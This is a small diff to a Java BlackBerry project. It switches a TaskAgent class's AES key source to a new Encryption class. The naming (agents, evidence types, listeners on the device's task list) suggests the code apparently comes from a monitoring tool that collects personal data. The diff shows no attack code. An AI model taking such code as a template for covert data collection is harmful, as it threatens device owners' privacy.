@@ -23,6 +23,7 @@ import net.rim.blackberry.api.pdap.BlackBerryPIMList;
 import net.rim.blackberry.api.pdap.PIMListListener;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.config.Keys;
+import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.EvidenceType;
@@ -69,7 +70,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
         debug.trace("TaskAgent");
         //#endif
 
-        markup = new Markup(agentId, Keys.getInstance().getAesKey());
+        markup = new Markup(agentId, Encryption.getKeys().getAesKey());
 
         parse(confParams);
         setDelay(SLEEPTIME);
